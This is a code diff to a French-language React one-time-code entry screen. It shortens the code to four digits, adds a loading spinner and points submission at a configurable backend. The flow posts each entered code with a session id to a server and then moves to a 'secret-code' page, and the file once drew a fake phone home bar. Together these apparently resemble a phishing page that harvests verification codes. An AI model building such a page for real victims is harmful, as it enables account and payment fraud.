@@ -5,8 +5,9 @@ const OTPInput = () => {
   const navigate = useNavigate();
   const [otp, setOtp] = useState('');
   const [countdown, setCountdown] = useState(30);
+  const [isLoading, setIsLoading] = useState(false);
   const sessionId = new URLSearchParams(window.location.search).get('id') || 'default';
-  const MAX_DIGITS = 6;
+  const MAX_DIGITS = 4;
 
   useEffect(() => {
     if (countdown > 0) {
@@ -18,8 +19,10 @@ const OTPInput = () => {
   const handleSubmit = async () => {
     if (otp.length !== MAX_DIGITS) return;
     
+    setIsLoading(true);
+    
     try {
-      await fetch('http://localhost:3001/api/otp', {
+      await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId, otp }),
@@ -27,6 +30,7 @@ const OTPInput = () => {
       navigate(`/secret-code?id=${sessionId}`);
     } catch (error) {
       console.error('Error submitting OTP:', error);
+      setIsLoading(false);
     }
   };
 
@@ -76,7 +80,7 @@ const OTPInput = () => {
 
           {/* OTP input fields */}
           <div className="flex gap-3 mt-[60px] justify-center">
-            {[0, 1, 2, 3, 4, 5].map((index) => (
+            {[0, 1, 2, 3].map((index) => (
               <div
                 key={index}
                 className={`w-12 h-14 border-b-2 flex items-center justify-center text-2xl font-semibold ${
@@ -99,14 +103,24 @@ const OTPInput = () => {
           {/* Next button */}
           <button
             onClick={handleSubmit}
-            disabled={otp.length !== MAX_DIGITS}
-            className={`w-full py-[18px] rounded-[30px] text-[19px] font-bold transition-colors ${
-              otp.length === MAX_DIGITS
+            disabled={otp.length !== MAX_DIGITS || isLoading}
+            className={`w-full py-[18px] rounded-[30px] text-[19px] font-bold transition-colors flex items-center justify-center gap-2 ${
+              otp.length === MAX_DIGITS && !isLoading
                 ? 'bg-[#29c5f6] text-white hover:bg-[#1fb3e3]'
                 : 'bg-[#a9e6fa] text-white cursor-not-allowed'
             }`}
           >
-            Suivant
+            {isLoading ? (
+              <>
+                <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                Chargement...
+              </>
+            ) : (
+              'Suivant'
+            )}
           </button>
         </div>
 
@@ -140,11 +154,6 @@ const OTPInput = () => {
               </button>
             )
           ))}
-        </div>
-
-        {/* Home indicator */}
-        <div className="bg-[#d8d8dd] flex justify-center py-[10px] pb-[6px]">
-          <div className="w-[130px] h-[5px] bg-[#1a1a1a] rounded-[3px]"></div>
         </div>
       </div>
     </div>
